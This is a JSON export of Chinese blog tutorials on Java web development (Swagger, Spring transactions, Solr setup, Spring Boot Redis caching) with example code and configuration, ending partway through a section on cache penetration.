[{"title":"swagger接口文档","date":"+022022-04-18T01:28:30.000Z","path":"22022/04/18/2022.04.18 swagger接口文档/","text":"Swagger 是什么Swagger 是一个规范且完整的框架，==用于生成、描述、调用和可视化 RestFul风格的Web 服务==。 Swagger 优势： 支持 API 自动生成同步的在线文档：使用 Swagger 后可以直接通过代码生成文档，不再需要自己手动编写接口文档了，对程序员来说非常方便，可以节约写文档的时间去学习新技术。 提供 Web 页面在线测试 API：光有文档还不够，Swagger 生成的文档还支持在线测试。参数和格式都定好了，直接在界面上输入参数对应的值即可在线测试接口。 使用 导入依赖 12345678910111213&lt;!--第一步：接口文档，需要写文件，所以需要 io--&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;!--引入 swagger2 文档注释框架--&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt; 编写配置类 可以配置接口文档标题、版本、在线访问URL； 配置所作用的 Controller 包路径。 12345678910111213141516171819202122232425/** * 第二步：接口文档的配置类 * 访问路径：http://localhost:8080/swagger-ui.html */@SpringBootConfigurationpublic class SwaggerConfig &#123; @Bean public Docket createDocker() &#123; return new Docket(DocumentationType.SWAGGER_2) // 配置控制器包名 .select().apis(RequestHandlerSelectors.basePackage(&quot;com.ishangu.controller&quot;)) // 指定扫描全部的 mapping .paths(PathSelectors.any()) // 构建接口文档的标题 .build().apiInfo(new ApiInfoBuilder().title(&quot;山谷卓越&quot;) // 接口文档的总体描述信息 .description(&quot;山谷网安文档描述&quot;) // 服务的 url .termsOfServiceUrl(&quot;http://localhost:8080/&quot;) // 接口文档的版本 .version(&quot;1.0.0&quot;).build() ); &#125;&#125; 在启动类上，开启注解 123456789@SpringBootApplication@MapperScan(&quot;com.ishangu.dao&quot;)@EnableSwagger2 // 第三步：开启 swagger 注解public class SpringbootMybatisPlusApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(SpringbootMybatisPlusApplication.class, args); &#125;&#125; 控制器方法上，添加文档注解 控制器方法必须使用 RestFul 风格请求格式； @Api(tags=&quot;title&quot;, description=&quot;desc&quot;)：作用于类，添加标题和描述； @ApiOperation(&quot;MethodDesc&quot;)：作用于方法，添加该接口功能描述； @ApiImplicitParam(name=&quot;argName&quot;, value=&quot;argDesc&quot;, defaultValue=&quot;testValue&quot;)：对单个参数进行描述：参数名、参数含义、测试时可取的默认值； @ApiImplicitParams(&#123;&#125;)：对多个参数进行描述，其内部大括号可包含多个@ApiImplicitParam注解，用分号间隔。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667@RestController@Controller@RequestMapping(&quot;user&quot;)@Api(tags=&quot;学生接口文档&quot;, description = &quot;学生测试&quot;)public class StudentController &#123; @Autowired IStudentService server ; private Logger logger = LoggerFactory.getLogger(getClass()) ; @ApiOperation(&quot;添加学生&quot;) @PostMapping public String save(Student student) &#123; server.save(student); return &quot;OK!&quot; ; &#125; @ApiOperation(&quot;根据Id删除学生&quot;) @ApiImplicitParam(name=&quot;id&quot;, value=&quot;用户Id&quot;, defaultValue = &quot;1&quot;) @DeleteMapping(&quot;&#123;id&#125;&quot;) public String delete(@PathVariable(&quot;id&quot;) Integer id) &#123; server.delete(id); return &quot;完成！&quot; ; &#125; @ApiOperation(&quot;根据Id修改学生信息&quot;) @ApiImplicitParams(&#123; @ApiImplicitParam(name=&quot;id&quot;, value=&quot;学生Id&quot;), @ApiImplicitParam(name=&quot;name&quot;, value=&quot;学生名&quot;) &#125;) @PutMapping public String update(Student student) &#123; server.update(student); return &quot;完成！&quot; ; &#125; @ApiOperation(&quot;根据Id查询学生&quot;) @ApiImplicitParam(name=&quot;id&quot;, value=&quot;学生Id&quot;, defaultValue = &quot;2&quot;) @GetMapping(&quot;&#123;id&#125;&quot;) public Student findById(@PathVariable(&quot;id&quot;) Integer id) &#123; return server.findById(id) ; &#125; @ApiIgnore // 表示这个方法不产生接口文档 @GetMapping public List&lt;Student&gt; findAll() &#123; logger.trace(&quot;这是 trace&quot;); logger.debug(&quot;这是 debug&quot;); logger.info(&quot;这是 info&quot;); logger.warn(&quot;这是 warn&quot;); logger.error(&quot;这是 error&quot;); System.out.println(&quot;进行了热部署！&quot;); return server.findAll(); &#125; @ApiOperation(&quot;学生登录&quot;) @ApiImplicitParams(&#123; @ApiImplicitParam(name=&quot;id&quot;, value=&quot;学生Id，作为账号&quot;, defaultValue = &quot;1&quot;), @ApiImplicitParam(name=&quot;name&quot;, value=&quot;学生名作为密码&quot;, defaultValue = &quot;方宁&quot;) &#125;) @GetMapping(&quot;&#123;id&#125;/&#123;name&#125;&quot;) public Student login(@PathVariable(&quot;id&quot;) Integer id,@PathVariable(&quot;name&quot;) String name) &#123; return server.login(id, name) ; &#125;&#125;","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"事务管理","date":"2022-04-22T02:01:30.000Z","path":"2022/04/22/2022.04.11 事务管理/","text":"Spring 事务管理无论我们使用 JDBC、Hibernate、Mybatis都需要对事务进行管理，==而 Spring 的 AOP 给我们提供了很方便的事务管理机制==。 spring事务管理接口Spring给我们提供事务管理接口： ==PlatformTransactionManager 接口== getRransaction：获取一个事务的状态； commit：提交一个事务； rollback：回滚事务。 主要实现子类，三个实现类底层实现逻辑不同，但是对于用于来讲没有区别，方法都一样。 DataSourceTransactionManager 主要针对普通数据源：JDBC、MyBatis。 HibernateTransactionManager 主要为 Hibernate 框架提供事务管理。 JtaTransactionManager 事务参数设置定义了设置事务常见参数的接口：==TransactionDefinition==。主要定义了事务的一些常用参数：==隔离级别==、传播规则等等…… 其中传播规则 定义了七种事务传播规则，规定了事务方法和事务方法发生==嵌套调用时事务==该如何进行传播。 propagation_required：两个事务方法融合成一个事务，常见操作； propagation_supports：方法A调用有事务的方法B，外层方法没有事务，即使内层有事务的也失效；外层有事务，那就事务生效； 隔离级别 ==隔离级别== default：使用数据库默认隔离级别； 读未提交 读已提交 可重复读 可序列化 Spring 管理事务方式编程式事务管理（较少用） 原理 使用TransactionTemplate，其中有一个 PlatformTransactionManager 接口的对象属性，可以对事物进行管理。 使用 直接使用 @Autowired 获取一个 TransactionTemplate 对象（spring 自动初始化的Bean），然后在代码中写事务的管理。 12345678@Servicepublic class UserServiceImple &#123; @Autowire TransactionTemplate transaction ; public void method() &#123; transaction.getTransactionManager(); &#125;&#125; 缺点 麻烦，代码变得复杂。 声明式事务管理 原理 通过 Spring 动态代理实现（AOP的一种实现方式）。 ==方法一== 使用@Transactional注解管理事务。作用范围：接口、接口方法、类、类方法。 作用到类上，类中所有方法都会有事务管理，要求方法必须是public（==主要通过反射，及动态代理==）； 可以在注解中，==设置异常增强触发回滚== rollbackForClassName 数组，元素为异常名，发生异常就回滚； noRollbackFor 数组，元素为异常的类型的.class。 可以在注解中，==设置隔离级别==。 缺点：所有类都需要添加注解，麻烦； ==方法二== ==使用xml配置文件声明事物管理==。只要方法名复合配置的规则，Spring 就会自动管理其事务（==主要通过配置AOP，动态代理==）。 在 Spring 配置文件中，配置事务管理器 &lt;aop:aspect&gt;：主要用来配置日志、缓存等切面； &lt;aop:advisor&gt;：主要用来配置事务切面，具体切入的==切面实现由事务管理器实现==，我们只需要配置切点以及通知到具体方法。 123456789101112131415161718192021&lt;!-- 配置 xml 通用事务管理 --&gt;&lt;!-- 1：创建事务管理器 --&gt;&lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;&gt;&lt;/property&gt;&lt;/bean&gt;&lt;!-- 2：配置通知，xml中需要引入通知标签链接 --&gt;&lt;tx:advice id=&quot;tx&quot;&gt; &lt;!-- 配置事务参数 --&gt; &lt;tx:attributes&gt; &lt;!-- 选择需要通知的方法，以及配置事务的参数：传播规则和隔离级别 --&gt; &lt;tx:method name=&quot;save*&quot; propagation=&quot;REQUIRED&quot;/&gt; &lt;tx:method name=&quot;find*&quot; read-only=&quot;true&quot;/&gt; &lt;/tx:attributes&gt;&lt;/tx:advice&gt;&lt;!-- 3：使用 aop 配置切点和切面管理事务 --&gt;&lt;aop:config&gt; &lt;aop:pointcut expression=&quot;execution(public * com.ishangu.service.impl.*.*(..))&quot; id=&quot;poi&quot;/&gt; &lt;aop:advisor advice-ref=&quot;tx&quot; pointcut-ref=&quot;poi&quot;/&gt;&lt;/aop:config&gt; * **缺点：所有的方法的事务都相同，如果要采用不同参数的事务，得用注解。** SpringBoot 中配置事务必要性​ 之前学习 SSM 和 SSH 的时候发现，Hibernate 操作数据库的接口，只有通过打开SqlSession会话，然后开启事务才行。但是，SSM 框架，使用 MyBatis 并没有事务的支持。 ​ 这样的话，一个方法执行可能因为异常只执行到一半就停止，这样就导致==破坏了原子性==，例如：张三给李四转账1000，先给张三划扣1000，再给李四增加1000，如果划扣完增加前出现异常，就会导致1000块凭空消失。 1234567891011User zs = mapper.getById(1);User ls = mapper.getById(2);zs.setMoney(zs.getMoney()-1000);mapper.updateById(zs);// 出现异常System.out.println(5/0);ls.setMoney(ls.getMoney()+1000);mapper.updateById(ls); 导入相关依赖 事务管理是基于 AOP 实现的，所以需要导入 AOP 依赖。 12345&lt;!--导入 aop 用于事务管理--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-aop&lt;/artifactId&gt;&lt;/dependency&gt; 开启注解开启 打开事务注解 在 SpringBoot 启动类上添加@EnableTransactionManagement。 使用注解 在类或者方法上添加@Transactional注解，即可，这时方法就会成为一个整体。 AOP配置类开启 新建事务配置类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263@SpringBootConfiguration@Aspect // 这个类也是一个切面public class TransactionConfig &#123; /** * 配置切入点表达式 */ private static final String AOP_EXPRESSION=&quot;execution(public * com.ishangu.service.impl.*.*(..))&quot; ; // 从 IOC 容器取出事务管理器 @Autowired private PlatformTransactionManager transactionManager ; // 创建一个事务拦截器 Bean @Bean public TransactionInterceptor tx() &#123; // 保存方法以及方法对应的事务 NameMatchTransactionAttributeSource source = new NameMatchTransactionAttributeSource() ; // 创建只读事务对象 RuleBasedTransactionAttribute read = new RuleBasedTransactionAttribute() ; // 设置事务属性只读 read.setReadOnly(true); // 设置只读事务的传播级别 read.setPropagationBehavior(TransactionDefinition.PROPAGATION_REQUIRED); // 创建 dml 事务对象 RuleBasedTransactionAttribute dml = new RuleBasedTransactionAttribute() ; // 设置 dml 事务传播级别 dml.setPropagationBehavior(TransactionDefinition.PROPAGATION_REQUIRED); // 设置事务失效时间，防止一致等待 dml.setTimeout(30000); // 设置需要回滚的异常 dml.setRollbackRules(Collections.singletonList(new RollbackRuleAttribute(Exception.class))); // 设置方法对应 Map&lt;String, TransactionAttribute&gt; map = new HashMap&lt;&gt;(); map.put(&quot;save*&quot;, dml) ; map.put(&quot;update*&quot;, dml) ; map.put(&quot;delete*&quot;, dml) ; map.put(&quot;insert*&quot;, dml) ; map.put(&quot;*&quot;, read) ; source.setNameMap(map); // 创建事务拦截器对象 TransactionInterceptor tx = new TransactionInterceptor(transactionManager, source); return tx ; &#125; /** * 配置切面（切入点+通知） */ @Bean public Advisor txAdvice() &#123; // 配置切入点 AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut() ; pointcut.setExpression(AOP_EXPRESSION); return new DefaultPointcutAdvisor(pointcut, tx()); &#125;&#125;","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"elasticsearch搜索","date":"2022-04-19T01:30:30.000Z","path":"2022/04/19/2022.04.19 elasticsearch搜索/","text":"elasticsearch 内容更新中…","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"solr 搜索服务器","date":"2022-04-18T06:16:30.000Z","path":"2022/04/18/2022.04.18 solr搜索服务器/","text":"介绍​ Solr 是一个基于 Apache Lucene 之上的搜索服务器，它是一个开源的、基于 Java 的信息检索库。它旨在驱动功能强大的文档检索应用程序 - 无论您需要根据用户的查询将数据服务到何处，Solr 都可以为您服务。 参考链接 什么是Solr​ 其实我们大多数人都使用过Solr，也许你不会相信我说的这句话，但是事实却是如此啊 ! 每当你想买自己喜欢的东东时，你可能会打开某宝或者某东，像这样一搜，就能搜到很多东西，这些搜索功能就是 Solr 提供的。 ​ 我们搜索得到的红色高亮关键字，就是 Solr 提供的。 为什么要用 Solr​ 现实生活中我们都知道大多数网站或应用都必须具有某种搜索功能，问题是搜索功能往往是巨大的资源消耗并且它们由于沉重的数据库加载而拖垮你的应用的性能。 ​ 这就是为什么**==转移负载到一个外部的搜索服务器是一个不错的主意==**，Apache Solr是一个流行的开源搜索服务器，它通过使用类似REST 的 HTTP API，这就确保你能从几乎任何编程语言来使用 solr。 ​ Solr 可以和 Hadoop一起使用。由于 Hadoop 处理大量数据，Solr帮助我们从这么大的源中找到所需的信息。==不仅限于搜索，Solr 也可以用于存储目的==。像其他 NoSQL 数据库一样，它是一种非关系数据存储和处理技术。 ​ ==总之，Solr是一个可扩展的，可部署，搜索/存储引擎，优化搜索大量以文本为中心的数据。==————————————————版权声明：本文为CSDN博主「飘…」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/luo609630199/article/details/82494708 两大优点 ==搜索更快== solr 本身也可以看成数据库(no sql类型)，但它比数据库搜索速度更快，所以在项目中我们一般把搜索的部分交给 solr。所以，我们一般看到的搜索结果并不直接来自于数据库，而是来源于 Solr。 ==具有分词效果== 数据库本身不能实现分词效果，而只能使用模糊查询，但是模糊查询非常低效，查询速度比较慢，由于在实际生活中，一般搜索是用的比较多的，这样数据库压力自然就很大，所以我们就让供专业的 solr 来做搜索功能。 部署 安装 JDK，Java 执行环境； 安装 Tomcat，Sorl 本质上是一个 Web 项目，所以需要运行在 tocmat 服务器中； 解压 solr，到/usr/local下； 将解压包中的 /solr-4.10.3/dist/solr下的 war 包放到 Tomacat 的 webapps 中，并解压； war 包解压到指定文件夹：unzip [test.war] -d [dir] war 包解压到当前文件夹：jar -xvf [test.war] 添加 solr 执行所需的依赖； 依赖在 solr-4.10.3 解压目录的example/lib/ext中； 全部复制到apache-tomcat/webapp/solr/WEB-INF/lib下； 指令：cp -r [源文件夹] [目标文件夹]，==复制文件夹需要带递归参数==。 创建 solr 家目录，存放配置文件； 在/usr/local下创建solr/solrhome 复制 solr-4.10.3 解压目录中example/solr 下所有文件到solrhome中 将其中的bin和collection1目录，移到上一级。 配置webapp/solr/WEB-INF/web.xml文件，指定家目录位置； 重启 tomcat，访问路径：host:8080/solr即可出现 solr web 界面。 配置中文分词​ Solr 是国外人开发的，对于中文分词只能区分单个汉字，不能具体区分词语。例如“我是中国人”，应该是分为“我”、“是”、“中国人”、“中国”、“人”，而不是单个汉字为一组划分。 ​ 因此，我们需要使用中文分词器，来替换原有的分词器。 步骤 将下载的中文分词器依赖IKAnalyzer2012FF_u1.jar导入到 Solr 项目中tomcat/webapp/solr/WEB-INF/lib下。 在WEB-INFO下新建一个classes文件夹，将下载的三个配置文件复制到该目录下 mydict.dic ext_stopword.dic IKAnalyzer.cfg.xml 修改 Solr 家目录中的配置文件/usr/local/solr/solrhome/collection1/conf/scheme.xml 在最后，配置自己的中文分词器（==取名 text_ik==），就是指定一个类的权限定名 1234&lt;!-- 配置自己的中文分词器 --&gt;&lt;fieldType name=&quot;text_ik&quot; class=&quot;solr.TextField&quot;&gt; &lt;analyzer class=&quot;org.wltea.analyzer.lucene.IKAnalyzer&quot; /&gt; &lt;/fieldType&gt; 上方的&lt;field&gt;标签，添加自己需要分词的数据库字段 12345678&lt;!-- 数据库中，表的哪些字段需要分词，就将其配置到这里 --&gt;&lt;!-- name：字段名 type：分词器 indexed：开启索引 stored：开启排序 --&gt;&lt;field name=&quot;name&quot; type=&quot;text_ik&quot; indexed=&quot;true&quot; stored=&quot;true&quot; /&gt; 删除多余的&lt;field&gt;标签，只保留name=&quot;_version_&quot;、name=&quot;_root_&quot;、name=&quot;id&quot;三个主要的&lt;field&gt;标签即可。 一并删除下发相关的fieldType标签，不然只删前面，后面没删，会报错。 重启 Tomcat，访问IP:8080/solr进入 Solr Web 界面，可以找到刚刚添加的text_ik分词器，对中文进行分词如下： SpringBoot集成Solr服务","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"消息队列","date":"2022-04-16T01:30:30.000Z","path":"2022/04/16/2022.04.16 消息队列/","text":"消息队列 内容更新中。。。","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"缓存","date":"2022-04-15T01:03:30.000Z","path":"2022/04/15/2022.04.15 缓存/","text":"缓存Java 底层缓存Java 中的底层缓存，虽然我们用不到这些缓存底层，但是一切的缓存框架都是基于这些基础来进行的，所以我们需要了解一下。 Java 中的 caching 主要定义了 **==5 个核心接口用来管理缓存==**，如下： cachingProvider（缓存提供者）：负责创建、配置、管理、获取、控制 cachManager，每个 java 应用在运行单独时候都可以创建多个缓存提供者（redis 或者其它）。 cacheManager（缓存管理器）：负责创建、配置、管理、获取、控制 cache，所有的 cache 都存在于 cacheManager 之中，并且一个缓存管理器只能被一个缓存提供者使用。 cache（缓存）：我们可以将 cache 理解成类似于 map 的数据结构，这些数据都是临时存储的，以 key 作为索引值，一个 cache 只能被一个 cacheManager 所持有（一个小队只能听从一个上级的管理，不然就忙不过来，冲突）。 Entry：是指存储在 cache 中的键值对 key-value。 expiry：每一个缓存 cache 中的键值 entry，都会有一个有效期，通过 expiry 来指定过期时间。 myBatis二级缓存​ 整个 mybatis 的二级缓存是一个 cachingProvider，其下面可以有一个或者多个 cacheManager，由 cacheManager 去管理所有 cacher。这里面每个 cache 都相当于一个 mapper 的缓存，每个 cache 都管理多个 entry，每个 entry 都相当于一条查询的 sql（key可能是 id 或者 sql 的序列化，value 就是查询结果）。 spring的缓存底层简介​ spring 是从 3.1 版本开始定义 cache 以及 cacheManager 接口来统一不同的缓存技术，并且提供了注解来简化我们的开发。 ​ cache 接口（spring 自身的接口）为缓存的组将定义了各种规范，以及缓存的各种操作等等，同时 spring 自身也提供了一些 cache 接口的实现组件，例如：redisCache、EhCacheCache、ConcurrentMapCache等。 接口​ Spring 自身的缓存管理接口： cacheManager（缓存管理器）：功能同 java 提供的 cacheManager； keyGenerator：缓存数据时候 key 的生成策略，可以通过其指定 key 是如何生成的。 缓存注解 @Cacheable 主要针对方法，可以通过方法的参数，名称等内容对其结果进行缓存。 @CacheEvict 清空缓存。 @CachePut 保证方法被调用，并希望结果存入到缓存中。 @EanbleCaching 用来开启基于注解的缓存。 SpringBoot配置Redis缓存 配置数据库驱动、数据库连接池、jpa依赖。 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.16&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.22&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;&lt;/dependency&gt; 在 Linux 中搭建 Redis 远程服务，开发默认端口 6379。 配置 SpringBoot 配置文件 配置数据源信息； 配置 Redis 数据库缓存服务器信息（服务器地址、端口、连接 redis 服务数据库密码） 注意：使用 yml 配置文件更为简洁，它并不是键值对形式，而是==树形结构==，spring.datasource.type可以转化为spring根部、datasource二级分支、type叶子端点。 123456789101112131415161718192021222324spring: datasource: # 配置数据库连接池 type: com.alibaba.druid.pool.DruidDataSource # 配置数据源 url: jdbc:mysql://localhost:3306/hiber username: admin password: 123456 driver-class-name: com.mysql.jdbc.Driver # 显示 sql 语句 jpa.show-sql: true # 配置 redis 缓存提供者 redis: host: 192.168.74.128 port: 6379 password: 123456 jedis: pool: max-active: 10 # 最大活跃连接 max-wait: 3000 max-idle: 10 min-idle: 1 使用 Spring 配置文件中配置完成 Redis 后，启动项目，Spring 会自动生成一个RedisTemplate&lt;String, Object&gt; 类型的对象，并注入到 IOC 容器中。 我们可以使用 RedisTemplate 对象提供的接口来操作 Redis 缓存； template.opsForValue()：操作键值对类型的数据； template.opsForSet()：操作集合类型的数据； template.opsForList()：操作队列类型的数据； template.opsForHash()：操作key-Map(key-value)类型的数据； template.expire()：操作数据的过期时间。 直接在 ServiceImple 层，为每个方法的 SQL 查询添加缓存。 1234567891011121314151617181920212223242526@Servicepublic class StudentServiceImpl implements StudentService &#123; @Autowired StudentRepository impl ; @Autowired RedisTemplate&lt;String, Object&gt; template; // 日志输出 Logger logger = LoggerFactory.getLogger(getClass()) ; @Override public List&lt;Student&gt; findAll() &#123; Object all = template.opsForValue.get(&quot;findAll&quot;) ; List&lt;Student&gt; students = null ; if(all != null) &#123; logger.info(&quot;******命中二级缓存*********&quot;); students = (List&lt;Student&gt;) all ; &#125; else &#123; logger.info(&quot;*********添加二级缓存********&quot;); students = (List&lt;Student&gt;) impl.findAll() ; template.opsForValue.set(&quot;findAll&quot;, students) ; &#125; return students; &#125;&#125; 问题及优化 问题一 每次使用 RedisTemplate（redis 模版）去操作 Redis 的时候，都需要通过 opsForValue 等操作，比较麻烦； 解决：编写操作工具类，然后将工具交给 Spring 管理。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321package com.ishangu.util;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.stereotype.Component;import org.springframework.util.CollectionUtils;import java.util.Collection;import java.util.Map;import java.util.Set;import java.util.List;import java.util.concurrent.TimeUnit;/** * 对 RedisTemplate 进行二次封装，简化其使用 */@Componentpublic class RedisUtil &#123; @Autowired private RedisTemplate&lt;String, Object&gt; template ; /** * 设置 key 的过期时间 * key 指定 key * time 指定过期时间 */ public boolean expire(String key, long time) &#123; try &#123; if(time &gt; 0) &#123; template.expire(key, time, TimeUnit.SECONDS) ; &#125; return true ; &#125; catch (Exception e) &#123; // 正常情况下，如果出现异常，这里需要添加日志输出信息 return false ; &#125; &#125; /** * 获取 key 的过期时间，如果返回 0，表示这个 key 永不失效 * @param key * @return */ public long getExpire(String key) &#123; return template.getExpire(key) ; &#125; /** * 判断 key 是否存在，存在返回 true * @param key * @return */ public boolean hasKey(String key) &#123; try &#123; return template.hasKey(key) ; &#125; catch (Exception e) &#123; return false ; &#125; &#125; /** * 删除指定的 key，可以一次删除多个 * @param keys * @return */ public boolean del(String ... keys) &#123; boolean result = false ; if(keys != null &amp;&amp; keys.length &gt; 0) &#123; if(keys.length == 1) &#123; result = template.delete(keys[0]) ; &#125; else &#123; result = template.delete( (Collection&lt;String&gt;) CollectionUtils.arrayToList(keys) ) &gt; 0 ? true : false ; &#125; &#125; return result ; &#125; /** * 获取字符串类型数据 * @param key * @return */ public Object get(String key) &#123; try &#123; return key == null ? null : template.opsForValue().get(key); &#125; catch (Exception e) &#123; e.printStackTrace(); return null ; &#125; &#125; /** * 存储永不过期字符串类型数据 * @param key * @param value * @return */ public boolean set(String key, Object value) &#123; try &#123; template.opsForValue().set(key, value) ; return true ; &#125; catch (Exception e) &#123; e.printStackTrace(); return false ; &#125; &#125; /** * 重载，添加值，同时设置过期时间 * @param key * @param value * @param time * @return */ public boolean set(String key, Object value, long time) &#123; try &#123; if(time &gt; 0) &#123; template.opsForValue().set(key, value, time, TimeUnit.SECONDS); &#125; else &#123; template.opsForValue().set(key, value); &#125; return true ; &#125; catch (Exception e) &#123; e.printStackTrace(); return false ; &#125; &#125; public long incr(String key, long i) &#123; return template.opsForValue().increment(key, i); &#125; public long decr(String key, long i) &#123; return template.opsForValue().increment(key, -i); &#125; /** * 获取 hash 的 value * @param key * @param hashKey * @return */ public Object hget(String key, String hashKey) &#123; return template.opsForHash().get(key,hashKey) ; &#125; public Map&lt;Object, Object&gt; hget(String key) &#123; return template.opsForHash().entries(key) ; &#125; /** * 向 hash 中添加一个 map，永不过期 * @param key * @param mapValue * @return */ public boolean hset(String key, Map&lt;String, Object&gt; mapValue) &#123; try &#123; template.opsForHash().putAll(key, mapValue); return true ; &#125; catch (Exception e) &#123; e.printStackTrace(); return false ; &#125; &#125; /** * 在 hash 中添加一个 map，并设置过期时间 * @param key * @param mapValue * @param time 过期时间, s * @return */ public boolean hset(String key, Map&lt;String, Object&gt; mapValue, long time) &#123; try &#123; template.opsForHash().putAll(key, mapValue); if(time &gt; 0) &#123; expire(key, time) ; &#125; return true ; &#125; catch (Exception e) &#123; e.printStackTrace(); return false ; &#125; &#125; /** * 判断 hash 中是否包含某个 key * @param key * @param hashKey * @return */ public boolean hasHashKey(String key, String hashKey) &#123; return template.opsForHash().hasKey(key, hashKey) ; &#125; public void deleteHash(String key, Object ... hashKey) &#123; template.opsForHash().delete(key, hashKey) ; &#125; public double hincr(String key, String hashKey, double by) &#123; return template.opsForHash().increment(key, hashKey, by) ; &#125; public double decr(String key, String hashKey, double by) &#123; return template.opsForHash().increment(key, hashKey, -by) ; &#125; // set 集合 public Set&lt;Object&gt; getSet(String key) &#123; return template.opsForSet().members(key) ; &#125; public boolean hasSetKey(String key, Object value) &#123; return template.opsForSet().isMember(key, value); &#125; public boolean setSetKey(String key, Object ... values) &#123; try &#123; template.opsForSet().add(key, values); return true; &#125; catch (Exception e) &#123; e.printStackTrace(); return false ; &#125; &#125; public boolean setSetKey(String key, long time, Object ... values) &#123; try &#123; template.opsForSet().add(key, values); if(time &gt; 0) &#123; expire(key, time); &#125; return true; &#125; catch (Exception e) &#123; e.printStackTrace(); return false ; &#125; &#125; public long getSetSize(String key) &#123; return template.opsForSet().size(key) ; &#125; public long deleteSet(String key, Object ... values) &#123; return template.opsForSet().remove(key, values) ; &#125; // zset 省略 // List public List&lt;Object&gt; lGet(String key, long start, long end) &#123; return template.opsForList().range(key, start, end) ; &#125; public long getListSize(String key) &#123; return template.opsForList().size(key) ; &#125; public Object lGet(String key, long index) &#123; // 越界没关系，redis 自身有解决 return template.opsForList().index(key, index) ; &#125; // 这是最简单的添加方法，如果要完整开发的工具类，这里添加的参数可以是 Map，Set public boolean lSet(String key, List&lt;Object&gt; value) &#123; try &#123; template.opsForList().rightPushAll(key, value) ; return true ; &#125; catch (Exception e) &#123; e.printStackTrace(); return false ; &#125; &#125; public boolean lSet(String key, List&lt;Object&gt; value, long time) &#123; try &#123; template.opsForList().rightPushAll(key, value) ; if(time &gt; 0) &#123; expire(key, time) ; &#125; return true ; &#125; catch (Exception e) &#123; e.printStackTrace(); return false ; &#125; &#125; public boolean lSet(String key, Object ... values) &#123; try &#123; template.opsForList().rightPushAll(key, values) ; return true ; &#125; catch (Exception e) &#123; e.printStackTrace(); return false ; &#125; &#125; public boolean lSet(String key, long time, Object ... values) &#123; try &#123; template.opsForList().rightPushAll(key, values) ; if(time &gt; 0) &#123; expire(key, time) ; &#125; return true ; &#125; catch (Exception e) &#123; e.printStackTrace(); return false ; &#125; &#125; public void lUpDate(String key, long index, Object newValue) &#123; template.opsForList().set(key, index, newValue); &#125; public long lDelete(String key, long count, Object value) &#123; return template.opsForList().remove(key, count, value) ; &#125;&#125; 问题二 Redis 生成 key-value 的序列化策略可自定义配置； 如果是采用默认策略，Redis 图形化工具看到的 key-value 都是 HEX 十六进制； 解决：==编写配置类，配置方法返回一个自定义的 Redis 模版。== 我们将 key 序列化策略弄为空，将 value 序列化为 json 格式。 1234567891011121314151617181920212223242526@SpringBootConfigurationpublic class RedisConfig &#123; Logger logger = LoggerFactory.getLogger(getClass()) ; @Bean public RedisTemplate&lt;String, Object&gt; redisTemplate(RedisConnectionFactory factory) &#123; RedisTemplate&lt;String, Object&gt; template = new RedisTemplate&lt;&gt;() ; // 将 new 出来的对象模版，与 Redis 连接工厂联系起来。 template.setConnectionFactory(factory); // new 一个字符串序列化对象 StringRedisSerializer stringRedisSerializer = new StringRedisSerializer() ; // 创建 json 序列化对象 Jackson2JsonRedisSerializer&lt;Object&gt; jackson = new Jackson2JsonRedisSerializer&lt;Object&gt;(Object.class) ; // 设置 key 的序列化方式 template.setKeySerializer(stringRedisSerializer); template.setHashKeySerializer(stringRedisSerializer); // 设置 value 的序列化方式 logger.info(&quot;*******************************************************&quot;); template.setValueSerializer(jackson); template.setHashValueSerializer(jackson); return template ; &#125;&#125; 重点概念缓存穿透 ==缓存穿透== 是指 Redis 中与数据库中都没有这个数据，那么用户不断发送这个请求，就会造成一直不断请求数据库，当流量过大的时候数据库就会崩掉。 ==解决方案== 